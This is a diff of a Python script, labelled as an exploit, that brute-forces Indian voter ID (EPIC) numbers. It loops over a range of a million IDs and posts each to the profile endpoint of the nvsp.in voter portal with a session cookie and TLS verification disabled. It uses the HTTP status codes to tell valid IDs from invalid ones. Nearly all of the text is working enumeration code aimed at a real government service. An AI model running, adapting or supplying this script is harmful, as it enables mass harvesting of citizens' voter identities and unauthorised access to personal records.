@@ -1,7 +1,13 @@
-import urllib3
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)   
 
+# Exploit Author: nxtexploit
+# written for bruteforcing Voter-IDs
+
+import urllib3
 import requests
+import time
+
+urllib3.disable_warnings()
+start = time.perf_counter() 
 
 cookies = {
     'nvsp': '4e565XXXXX',
@@ -40,9 +46,13 @@ for voter_ID in range(2000000,2999999,1):
 
     response = requests.post('https://www.nvsp.in/Account/MyProfile',allow_redirects=False, cookies=cookies, headers=headers, data=data, verify=False)
 
-    if 'Object moved' in response.text:
-        print(f"Epic_ID FOUND= WRI{voter_ID}")
+    if response.status_code == 302:
+        print(f"Epic-ID FOUND = WRI{voter_ID}")
+    elif response.status_code == 200:
+        print("Not valid ID")
+    else:
+        print("session expired")
 
- 
-    if 'Dashboard' in response.text:
-        print("Not valid")
+finish = time.perf_counter()
+
+print(f'\n\nFinished in {round(finish-start, 2)} second(s)\n')
